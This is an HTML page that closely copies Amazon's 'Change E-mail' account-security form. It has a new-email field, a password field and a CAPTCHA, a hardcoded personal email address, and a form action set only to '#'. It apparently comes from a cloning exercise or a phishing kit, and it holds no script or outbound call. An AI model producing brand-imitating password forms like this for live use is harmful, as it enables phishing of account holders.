<!DOCTYPE html>
<html>
    <head>
        <title>Edit Email</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
        <style>
            .a-container {
            min-width: 998px;
            padding: 14px 18px 18px;
            margin: 0 auto;
            }
            .a-section:last-child {
            margin-bottom: 0;
            }
            .auth-pagelet-desktop-wide-container {
            max-width: 600px;
            margin: 0 auto;
            }
            .a-ordered-list.a-horizontal, .a-unordered-list.a-horizontal, ol.a-horizontal, ul.a-horizontal {
            display: block;
            margin-left: 0;
            }
            .a-ordered-list, .a-unordered-list, ol, ul {
            padding: 0;
            }
            .a-ordered-list, ol {
            margin: 0 0 18px 20px;
            color: #767676;
            }
            .a-ordered-list.a-horizontal li, .a-unordered-list.a-horizontal li, ol.a-horizontal li, ul.a-horizontal li {
            display: inline-block;
            margin: 0 10px 0 0;
            }
            .a-ordered-list li, .a-unordered-list li, ol li, ul li {
            word-wrap: break-word;
            }
            .a-ordered-list li, ol li {
            list-style: decimal;
            }
            .a-ordered-list .a-list-item, .a-unordered-list .a-list-item, ol .a-list-item, ul .a-list-item {
            color: #111;
            }
            a, a:active, a:link, a:visited {
            text-decoration: none;
            color: #0066c0;
            }
            h1 {
            font-weight: 400;
            font-size: 28px;
            line-height: 1.2;
            }
            .a-section:last-child {
            margin-bottom: 0;
            }
            .a-spacing-top-large {
            margin-top: 22px!important;
            }
            .a-box {
            display: block;
            border-radius: 4px;
            border: 1px #ddd solid;
            background-color: #fff;
            }
            .a-box .a-box-inner {
            border-radius: 4px;
            position: relative;
            padding: 14px 18px;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            .a-row {
            width: 100%;
            }
            .a-row:after {
            clear: both;
            }
            form {
            margin-bottom: 14px;
            }
            .a-ember input, .a-ember select, .a-ember textarea {
            font-family: "Amazon Ember",Arial,sans-serif;
            }
            input, select, textarea {
            line-height: 19px;
            color: #111;
            }
            button, input, select, textarea {
            margin: 0;
            font-size: 100%;
            vertical-align: middle;
            }
            .a-section {
            margin-bottom: 10px;
            }
            label, legend {
            display: block;
            padding-left: 2px;
            padding-bottom: 2px;
            font-weight: 700;
            }
            .a-section:last-child {
            margin-bottom: 0;
            }
            .a-padding-mini {
            padding: 4px 6px!important;
            }
            .a-spacing-large, .a-ws .a-ws-spacing-large {
            margin-bottom: 22px!important;
            }
            .a-input-text, input[type=text], input[type=number], input[type=tel], input[type=password], input[type=date], input[type=email], input[type=search] {
            background-color: #fff;
            height: 31px;
            padding: 3px 7px;
            line-height: normal;
            }
            .a-input-text, input[type=text], input[type=number], input[type=tel], input[type=password], input[type=search], select.a-select-multiple, textarea {
            border: 1px solid #a6a6a6;
            border-top-color: #949494;
            border-radius: 3px;
            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
            outline: 0;
            }
            .a-width-large {
            width: 250px!important;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            .a-fixed-right-grid {
            position: relative;
            }
            .a-fixed-right-grid .a-fixed-right-grid-inner {
            position: relative;
            padding: 0;
            }
            .a-fixed-right-grid .a-fixed-right-grid-col {
            position: relative;
            overflow: visible;
            zoom: 1;
            min-height: 1px;
            }
            .a-spacing-large, .a-ws .a-ws-spacing-large {
            margin-bottom: 22px!important;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            h4 {
            font-weight: 400;
            font-size: 17px;
            line-height: 1.255;
            }
            #auth-captcha-image-container {
            height: 70px;
            width: 200px;
            margin-right: auto;
            }
            img {
            vertical-align: top;
            }
            img {
            max-width: 100%;
            border: 0;
            }
            .a-ws div.a-column, div.a-column {
            margin-right: 2%;
            float: left;
            min-height: 1px;
            overflow: visible;
            }
            .a-row .a-span12, .a-span12, .a-ws .a-row .a-ws-span12, .a-ws .a-ws-span12 {
            width: 100%;
            /*margin-right: 0;*/
            }
            .a-ws div.a-column, div.a-column {
            margin-right: 2%;
            float: left;
            min-height: 1px;
            overflow: visible;
            }
            .a-row .a-span12, .a-span12, .a-ws .a-row .a-ws-span12, .a-ws .a-ws-span12 {
            width: 100%;
            /*margin-right: 0;*/
            }
            .auth-display-none {
            display: none;
            }
            .a-spacing-large, .a-ws .a-ws-spacing-large {
            margin-bottom: 22px!important;
            }
            .a-spacing-top-medium {
            margin-top: 18px!important;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            .a-ws div.a-column, div.a-column {
            margin-right: 2%;
            float: left;
            min-height: 1px;
            overflow: visible;
            }
            .a-button {
            background: #e7e9ec;
            border-radius: 3px;
            border-color: #adb1b8 #a2a6ac #8d9096;
            border-style: solid;
            border-width: 1px;
            cursor: pointer;
            display: inline-block;
            padding: 0;
            text-align: center;
            text-decoration: none!important;
            vertical-align: middle;
            }
            .a-button .a-button-inner {
            background: #eff0f3;
            background: -webkit-linear-gradient(top,#f7f8fa,#e7e9ec);
            background: linear-gradient(to bottom,#f7f8fa,#e7e9ec);
            }
            .a-button-inner {
            display: block;
            position: relative;
            overflow: hidden;
            height: 29px;
            box-shadow: 0 1px 0 rgba(255,255,255,.6) inset;
            border-radius: 2px;
            }
            button, input[type=button], input[type=reset], input[type=submit] {
            cursor: pointer;
            -webkit-appearance: button;
            }
            .a-button-input {
            position: absolute;
            background-color: transparent;
            color: transparent;
            border: 0;
            cursor: pointer;
            height: 100%;
            width: 100%;
            left: 0;
            top: 0;
            opacity: .01;
            outline: 0;
            overflow: visible;
            z-index: 20;
            }
            .a-button .a-button-text {
            color: #111;
            }
            .a-button-text {
            background-color: transparent;
            border: 0;
            display: block;
            font-family: Arial,sans-serif;
            font-size: 13px;
            line-height: 29px;
            margin: 0;
            outline: 0;
            padding: 0 10px 0 11px;
            text-align: center;
            white-space: nowrap;
            }
            audio:not([controls]) {
            display: none;
            }
            .a-ember h1, .a-ember h2, .a-ember h3, .a-ember h4 {
            font-family: "Amazon Ember",Arial,sans-serif;
            }
            label, legend {
            display: block;
            padding-left: 2px;
            padding-bottom: 2px;
            font-weight: 700;
            }
            .a-input-text, input[type=text], input[type=number], input[type=tel], input[type=password], input[type=date], input[type=email], input[type=search] {
            background-color: #fff;
            height: 31px;
            padding: 3px 7px;
            line-height: normal;
            }
            .auth-inlined-error-message {
            display: none;
            }
            .a-alert-inline {
            display: inline-block;
            border: none;
            vertical-align: middle;
            background-color: transparent;
            }
            .a-spacing-top-mini {
            margin-top: 6px!important;
            }
            .a-alert-inline-error .a-alert-container {
            padding-left: 16px;
            color: #c40000;
            }
            .a-alert-inline .a-alert-container {
            padding: 0;
            }
            .a-box .a-box-inner {
            border-radius: 4px;
            position: relative;
            padding: 14px 18px;
            }
            .a-alert-inline .a-icon-alert {
            height: 13px;
            width: 14px;
            position: absolute;
            left: 2px;
            top: 2px;
            }
            .a-alert-inline-error .a-icon-alert, .a-icon-error.a-icon-small {
            width: 5px;
            background-position: -141px -130px;
            }
            .a-icon, .a-link-emphasis:after {
            background-image: url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-sprite_1x-c4a765a…._V2_.png);
            -webkit-background-size: 400px 750px;
            background-size: 400px 750px;
            background-repeat: no-repeat;
            display: inline-block;
            vertical-align: top;
            }
            .a-alert-inline .a-alert-container .a-alert-content {
            margin-bottom: 0;
            text-align: left;
            font-size: 12px;
            line-height: 15px;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            .a-fixed-right-grid {
            position: relative;
            }
            .a-spacing-large, .a-ws .a-ws-spacing-large {
            margin-bottom: 22px!important;
            }
            .a-button-primary {
            background: #f0c14b;
            border-color: #a88734 #9c7e31 #846a29;
            color: #111;
            }
            .a-button {
            background: #e7e9ec;
            border-radius: 3px;
            border-color: #adb1b8 #a2a6ac #8d9096;
            border-style: solid;
            border-width: 1px;
            cursor: pointer;
            display: inline-block;
            padding: 0;
            text-align: center;
            text-decoration: none!important;
            vertical-align: middle;
            margin-top: 15px;
            }
            .a-button-primary {
            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
            }
            .a-button-primary .a-button-inner {
            background: #bd081b;
            }
            .a-button-inner {
            display: block;
            position: relative;
            overflow: hidden;
            height: 29px;
            border-radius: 2px;
            }
            .a-button-input {
            position: absolute;
            background-color: transparent;
            color: transparent;
            border: 0;
            cursor: pointer;
            height: 100%;
            width: 100%;
            left: 0;
            top: 0;
            opacity: .01;
            outline: 0;
            overflow: visible;
            z-index: 20;
            }
            .a-button-primary .a-button-text {
            color: #111;
            }
            .a-button-text {
            background-color: transparent;
            border: 0;
            display: block;
            font-family: Arial,sans-serif;
            font-size: 13px;
            line-height: 29px;
            margin: 0;
            outline: 0;
            padding: 0 10px 0 11px;
            text-align: center;
            white-space: nowrap;
            }
            .a-box .a-box-inner {
            border-radius: 4px;
            position: relative;
            padding: 14px 18px;
            }
            .a-row .a-span12, .a-span12, .a-ws .a-row .a-ws-span12, .a-ws .a-ws-span12 {
            width: 100%;
            margin-right: 0;
            }
            .a-spacing-base, .a-ws .a-ws-spacing-base {
            margin-bottom: 14px!important;
            }
            .a-spacing-large, .a-ws .a-ws-spacing-large {
            margin-bottom: 22px!important;
            }
            .iwidth{
            width: 50%;
            }
            @media only screen and (max-width: 480px) {
            .a-container{
            min-width: unset;
            }
            .a-ordered-list:last-child, .a-unordered-list:last-child, ol:last-child, ul:last-child {
            margin-bottom: unset;
            }
            .iwidth{
            width: 80%;
            }
            }
        </style>
    </head>
    <body>
        <div class="a-container">
            <div class="a-section auth-pagelet-desktop-wide-container">
                <div class="a-section auth-pagelet-desktop-wide-container">
                    <ol id="breadcrumb_CNEP" class="a-ordered-list a-horizontal">
                        <li><span class="a-list-item">
                            <a class="a-link-normal" href="#">
                            Your Account
                            </a>
                            </span>
                        </li>
                        <li><span class="a-list-item">
                            ›
                            </span>
                        </li>
                        <li><span class="a-list-item">
                            <a class="a-link-normal" href="#">
                            Login &amp; Security
                            </a>
                            </span>
                        </li>
                        <li><span class="a-list-item">
                            ›
                            </span>
                        </li>
                        <li><span class="a-list-item a-color-state">
                            Change E-mail
                            </span>
                        </li>
                    </ol>
                    <h1 id="ap_cnep_header">
                        Change E-mail
                    </h1>
                    <div class="a-section a-spacing-top-large">
                        <div class="a-box">
                            <div class="a-box-inner">
                                <div class="a-row a-spacing-base">
                                    Use the form below to change the e-mail address for your Amazon account.  Use the new address next time you log in or place an order.
                                </div>
                                <form method="post" novalidate="" action="#">
                                    <input type="hidden" name="appActionToken" value=""><input type="hidden" name="appAction" value="CNEP_EMAIL_CHANGE">
                                    <input type="hidden" name="ces" value="">
                                    <input type="hidden" name="openid.return_to" value="">
                                    <input type="hidden" name="prevRID" value="">
                                    <input type="hidden" name="email" value="">
                                    <input type="hidden" name="workflowState" value="">
                                    <div class="a-section">
                                        <div class="a-row">
                                            <label class="a-form-label">
                                            Old e-mail:
                                            </label>
                                        </div>
                                        <div class="a-row">
                                            <div id="ap_email_old" class="a-section a-padding-mini">
                                                ramsawase77@gmail.com
                                            </div>
                                        </div>
                                    </div>
                                    <div class="a-section a-spacing-large">
                                        <div class="a-row">
                                            <label for="ap_email_new" class="a-form-label">
                                            New e-mail:
                                            </label>
                                        </div>
                                        <div class="a-row">
                                            <input type="email" id="ap_email_new" autocomplete="off" name="emailNew" tabindex="1" class="a-input-text a-width-large">
                                        </div>
                                    </div>
                                    <div class="a-section a-spacing-large">
                                        <div class="a-row">
                                            <label for="ap_email_new_check" class="a-form-label">
                                            Re-enter new e-mail:
                                            </label>
                                        </div>
                                        <div class="a-row a-spacing-large">
                                            <input type="email" id="ap_email_new_check" autocomplete="off" name="emailNewCheck" tabindex="2" class="a-input-text a-width-large">
                                        </div>
                                    </div>
                                    <div class="a-section a-spacing-large">
                                        <div class="a-row">
                                            <label for="auth-password" class="a-form-label">
                                            Password:
                                            </label>
                                        </div>
                                        <div class="a-row">
                                            <input type="password" maxlength="1024" id="ap_password" name="password" tabindex="3" class="a-input-text a-width-large">
                                        </div>
                                    </div>
                                    <div class="a-fixed-right-grid a-spacing-base">
                                        <div class="a-fixed-right-grid-inner" style="padding-right:0px">
                                            <div class="a-fixed-right-grid-col" style="float:left;">
                                                <div class="a-section">
                                                    <div id="image-captcha-section" class="a-section a-spacing-large">
                                                        <input type="hidden" name="use_image_captcha" value="true" id="use_image_captcha">
                                                        <div class="a-section a-spacing-base">
                                                            <h4>
                                                                Enter the characters you see
                                                            </h4>
                                                            <div id="auth-captcha-image-container" class="a-section a-text-center">
                                                                <img alt="Visual CAPTCHA image, continue down for an audio option." src="images/captcha.jpg" data-refresh-url="" id="auth-captcha-image">
                                                            </div>
                                                            <div class="a-row">
                                                                <div class="a-column a-span12 a-text-center">
                                                                    <a id="auth-captcha-refresh-link" class="a-link-normal" tabindex="4" href="">
                                                                    See a new challenge
                                                                    </a>
                                                                    <a id="auth-captcha-noop-link" class="a-link-normal" href="" style="display: none;">
                                                                    See a new challenge
                                                                    </a>
                                                                </div>
                                                            </div>
                                                            <div id="auth-switch-captcha-to-audio-container" class="a-row">
                                                                <div class="a-column a-span12 a-text-center" style="margin-bottom: 20px;">
                                                                    <a id="auth-switch-captcha-to-audio" class="a-link-normal" tabindex="4" href="">
                                                                    Hear the challenge
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div id="audio-captcha-section" class="a-section a-spacing-large auth-display-none">
                                                        <input type="hidden" name="use_audio_captcha" value="false" id="use_audio_captcha">
                                                        <h4>
                                                            Enter the numbers you hear
                                                        </h4>
                                                        <div class="a-section a-spacing-base a-spacing-top-medium">
                                                            <div class="a-row">
                                                                <div class="a-column a-span12 a-text-center">
                                                                    <a id="auth-refresh-audio" class="a-link-normal" tabindex="4" href="">
                                                                    Hear a new challenge
                                                                    </a>
                                                                </div>
                                                            </div>
                                                            <div class="a-row">
                                                                <div class="a-column a-span12 a-text-center">
                                                                    <a id="auth-switch-captcha-to-image" class="a-link-normal" tabindex="4" href="">
                                                                    See the challenge
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="a-section a-spacing-top-medium a-text-center">
                                                            <div id="auth-captcha-audio-container" class="a-section a-spacing-base a-text-center">
                                                                <span id="audio-captcha-play-button" class="a-button a-button-base"><span class="a-button-inner"><input id="audio-captcha-play-pause-button" tabindex="3" class="a-button-input" type="submit" aria-labelledby="audio-captcha-play-button-announce"><span id="audio-captcha-play-button-announce" class="a-button-text" aria-hidden="true">
                                                                Play/Pause
                                                                </span></span></span>
                                                                <audio id="audio-captcha">
                                                                    <source id="mp3-file" src="" type="audio/mpeg" data-refresh-url="">
                                                                </audio>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <label for="auth-captcha-guess" class="a-form-label">
                                                    Type characters
                                                    </label>
                                                    <input type="text" id="auth-captcha-guess" autocomplete="off" name="guess" tabindex="4" class="a-input-text a-span12 auth-required-field iwidth">
                                                    <div id="auth-guess-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                                        <div class="a-box-inner a-alert-container">
                                                            <i class="a-icon a-icon-alert"></i>
                                                            <div class="a-alert-content">
                                                                Enter the characters as they are shown in the image.
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="a-section a-text-center">
                                                    <a class="a-link-normal" href="">
                                                    Having trouble or sight impaired?
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="a-section a-spacing-large">
                                        <span class="a-button a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="cnep_1B_submit_button" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce" style="color: #fff;">
                                        Save changes
                                        </span></span></span>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>